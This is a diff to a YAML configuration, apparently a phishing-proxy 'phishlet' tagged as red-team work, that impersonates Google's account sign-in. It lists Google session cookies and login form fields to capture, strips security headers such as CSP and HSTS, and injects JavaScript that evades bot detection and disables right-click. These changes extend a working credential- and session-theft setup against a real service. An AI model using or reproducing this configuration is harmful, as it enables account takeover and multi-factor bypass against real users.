@@ -1,26 +1,58 @@
 name: "Google-Accounts"
-author: "Vanta v5"
+author: "Vanta v5 Red Team"
 min_ver: "5.0.0"
 proxy_hosts:
   - subdomain: "accounts"
     target: "accounts.google.com"
-auth_urls: ["/signin/v2/identifier", "/ServiceLogin"]
-landing_path: ["/signin/v2/identifier"]
+  - subdomain: "ssl"
+    target: "ssl.gstatic.com"
+  - subdomain: "www"
+    target: "www.google.com"
+  - subdomain: "apis"
+    target: "apis.google.com"
+auth_urls: 
+  - "/signin/v2/identifier"
+  - "/ServiceLogin"
+  - "/v3/signin/identifier"
+landing_path: 
+  - "/signin/v2/identifier"
+  - "/ServiceLogin"
 auth_tokens:
   - {type: "cookie", name: "SID"}
   - {type: "cookie", name: "HSID"}
   - {type: "cookie", name: "SSID"}
+  - {type: "cookie", name: "APISID"}
+  - {type: "cookie", name: "SAPISID"}
+  - {type: "cookie", name: "__Secure-1PSID"}
   - {type: "cookie", name: "__Secure-3PSID"}
+  - {type: "cookie", name: "__Secure-1PAPISID"}
+  - {type: "cookie", name: "__Secure-3PAPISID"}
+  - {type: "cookie", name: "NID"}
+  - {type: "cookie", name: "GAPS"}
+  - {type: "cookie", name: "LSID"}
 credentials:
   - {type: "post_param", name: "identifier", regex: null}
   - {type: "post_param", name: "password", regex: null}
   - {type: "post_param", name: "Email", regex: null}
   - {type: "post_param", name: "Passwd", regex: null}
-injections: []
+  - {type: "post_param", name: "f.req", regex: null}
+injections:
+  - trigger_path: "/signin"
+    position: "body_end"
+    content: |
+      (function(){
+        // Google Anti-Bot Evasion
+        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+        // Mock Plugins
+        Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
+        // Disable right-click for security
+        document.addEventListener('contextmenu', event => event.preventDefault());
+      })();
 headers:
   - {action: "remove", name: "Content-Security-Policy"}
   - {action: "remove", name: "X-Frame-Options"}
   - {action: "remove", name: "X-Content-Type-Options"}
+  - {action: "remove", name: "Strict-Transport-Security"}
 path_rewrites:
   - {pattern: "^/$", replace: "/signin/v2/identifier", methods: ["GET"]}
 cookie_rewrites: []
@@ -29,5 +61,6 @@ blocklist:
 form_actions:
   - {selector: "form[action*=\"ServiceLogin\"], form[action*=\"signin\"]", action_to: "/session/login"}
 bridges:
-  - {prefix: "/_gapi/", target_host: "apis.google.com", strip_prefix: true, cors: "mirror"}
-  - {prefix: "/_gstatic/", target_host: "ssl.gstatic.com", strip_prefix: true, cors: "mirror"}
+  - {prefix: "/_gapi/", target_host: "apis.google.com", strip_prefix: true, cors: "allow_all"}
+  - {prefix: "/_gstatic/", target_host: "ssl.gstatic.com", strip_prefix: true, cors: "allow_all"}
+  - {prefix: "/_play/", target_host: "play.google.com", strip_prefix: true, cors: "allow_all"}
